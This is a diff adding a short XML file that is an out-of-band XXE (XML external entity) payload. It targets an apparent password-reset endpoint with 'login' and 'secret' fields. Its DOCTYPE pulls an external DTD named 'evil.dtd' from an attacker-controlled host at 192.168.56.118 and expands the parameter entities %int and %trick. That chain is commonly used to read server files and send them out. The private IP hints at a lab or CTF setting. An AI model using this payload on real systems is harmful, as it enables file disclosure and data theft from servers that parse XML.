@@ -1,0 +1,10 @@
+<?xml version="1.0"?>
+<!DOCTYPE reset [
+<!ENTITY % remote SYSTEM "http://192.168.56.118/evil.dtd">
+%remote;
+%int;
+%trick; ]>
+<reset>
+<login>aaaa</login>
+<secret>formation</secret>
+</reset>
